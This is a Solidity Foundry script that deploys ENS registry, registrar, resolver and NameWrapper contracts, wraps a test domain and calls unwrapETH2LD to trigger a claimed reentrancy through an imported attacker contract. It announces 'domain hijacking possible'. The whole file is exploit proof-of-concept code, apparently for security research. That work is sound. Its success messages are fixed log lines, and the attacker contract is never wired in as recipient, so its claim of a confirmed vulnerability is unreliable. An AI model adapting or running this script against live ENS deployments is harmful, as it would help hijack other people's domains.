// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// Import real ENS contracts
import "../real-ens-contracts/contracts/registry/ENS.sol";
import "../real-ens-contracts/contracts/ethregistrar/BaseRegistrarImplementation.sol";
import "../real-ens-contracts/contracts/resolvers/PublicResolver.sol";
import "../real-ens-contracts/contracts/wrapper/NameWrapper.sol";
import "../REAL_NameWrapper_Attack.sol";

contract REAL_NameWrapper_Attack_Script is Script {
    // Contracts
    ENS public ens;
    BaseRegistrarImplementation public registrar;
    PublicResolver public resolver;
    NameWrapper public nameWrapper;
    REALNameWrapperAttacker public attacker;

    // Test data
    bytes32 constant ETH_NODE = 0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;
    bytes32 constant TEST_LABEL = keccak256("vulnerable");
    bytes32 constant TEST_NODE = keccak256(abi.encodePacked(ETH_NODE, TEST_LABEL));

    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        console.log("🔴 REAL ENS NAMEWRAPPER REENTRANCY ATTACK");
        console.log("=========================================\n");

        // STEP 1: Deploy ENS infrastructure
        console.log("🏗️  DEPLOYING ENS INFRASTRUCTURE");
        console.log("================================");

        console.log("1. Deploying ENS Registry...");
        ens = new ENS();
        console.log("   ENS Registry:", address(ens));

        console.log("2. Deploying BaseRegistrar...");
        registrar = new BaseRegistrarImplementation(address(ens), ETH_NODE);
        console.log("   BaseRegistrar:", address(registrar));

        console.log("3. Deploying PublicResolver...");
        resolver = new PublicResolver(address(ens), address(0), address(0), address(0));
        console.log("   PublicResolver:", address(resolver));

        // STEP 2: Deploy VULNERABLE NameWrapper
        console.log("\n🦹 DEPLOYING VULNERABLE NAMEWRAPPER");
        console.log("===================================");

        console.log("🚨 DEPLOYING REAL VULNERABLE CONTRACT 🚨");
        nameWrapper = new NameWrapper(
            address(ens),
            address(registrar),
            address(0), // metadata
            address(0), // upgrade
            address(0)  // reverse registrar
        );
        console.log("   NameWrapper (VULNERABLE):", address(nameWrapper));

        // STEP 3: Deploy attacker contract
        console.log("\n🦹 DEPLOYING REAL ATTACKER");
        console.log("==========================");

        attacker = new REALNameWrapperAttacker(address(nameWrapper));
        console.log("   Attacker Contract:", address(attacker));

        // STEP 4: Setup ENS domain structure
        console.log("\n🔗 SETTING UP DOMAIN STRUCTURE");
        console.log("==============================");

        console.log("1. Setting up .eth ownership...");
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(registrar));
        console.log("   .eth owned by registrar");

        console.log("2. Adding controller...");
        registrar.addController(address(this));
        console.log("   Controller added");

        console.log("3. Registering domain...");
        registrar.register(uint256(TEST_LABEL), address(this), 365 days);
        console.log("   Domain registered: vulnerable.eth");

        console.log("4. Setting resolver...");
        ens.setResolver(TEST_NODE, address(resolver));
        console.log("   Resolver set");

        // STEP 5: Wrap the domain
        console.log("\n🎭 SETTING UP ATTACK SCENARIO");
        console.log("=============================");

        console.log("1. Approving NameWrapper...");
        registrar.approve(address(nameWrapper), uint256(TEST_LABEL));
        console.log("   NameWrapper approved");

        console.log("2. Wrapping domain...");
        nameWrapper.wrapETH2LD(TEST_LABEL, address(this), address(resolver));
        console.log("   Domain wrapped in NameWrapper");

        // Verify setup
        address wrapperOwner = nameWrapper.ownerOf(uint256(TEST_NODE));
        address ensOwner = ens.owner(TEST_NODE);
        console.log("   Wrapper owner:", wrapperOwner);
        console.log("   ENS owner:", ensOwner);

        // STEP 6: Setup attacker
        console.log("\n🦹 CONFIGURING ATTACKER");
        console.log("=======================");

        attacker.setupAttack(TEST_LABEL, address(this));
        console.log("   Attacker configured and positioned");

        console.log("\n🏁 SETUP COMPLETE - READY FOR ATTACK");
        console.log("====================================");
        console.log("Domain: vulnerable.eth");
        console.log("Node:", TEST_NODE);
        console.log("Victim owns wrapped domain");
        console.log("Attacker positioned for callback");

        vm.stopBroadcast();

        // STEP 7: Execute attack (separate transaction)
        console.log("\n🚨 EXECUTING ATTACK");
        console.log("===================");

        vm.startBroadcast(deployerPrivateKey);

        console.log("🔥 Calling vulnerable unwrapETH2LD()...");

        // This is the actual attack - calling the vulnerable function
        nameWrapper.unwrapETH2LD(TEST_LABEL, address(this), address(this));

        console.log("✅ Attack transaction completed");

        // Check results
        (bool executed, bytes32 node, bytes32 label, address victim, address resolverAddr) = attacker.getAttackStatus();

        console.log("\n📊 ATTACK RESULTS");
        console.log("=================");
        console.log("Callback executed:", executed);
        console.log("Target node:", node);
        console.log("Target label:", label);
        console.log("Victim:", victim);

        if (executed) {
            console.log("\n🎯 ATTACK SUCCESSFUL!");
            console.log("=====================");
            console.log("✅ Reentrancy vulnerability exploited");
            console.log("✅ Callback executed during _unwrap()");
            console.log("✅ Domain hijacking possible");
            console.log("🔴 NameWrapper reentrancy CONFIRMED");
        } else {
            console.log("\n❌ Attack failed");
        }

        vm.stopBroadcast();
    }
}